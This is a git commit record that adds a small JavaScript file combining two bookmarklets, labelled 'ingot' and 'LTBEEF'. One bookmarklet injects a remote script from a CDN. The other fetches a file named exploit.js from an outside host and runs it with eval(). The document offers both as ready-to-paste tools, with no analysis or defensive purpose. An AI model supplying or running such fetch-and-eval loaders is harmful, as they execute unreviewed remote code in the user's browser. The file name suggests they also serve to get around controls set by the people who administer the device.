a50eb82b01e34894f4c0e4c8ce18ef2f5a4b2c25
BFBmain <73242022+BFB2q@users.noreply.github.com>
2023-03-22 18:07:48 -0500

    added ingot and LTBEEF codes in one :)

---
+++ ltbeefingotcomb.js
@@ -0,0 +1,4 @@
+//ingot
+javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
+//LTBEEF
+javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
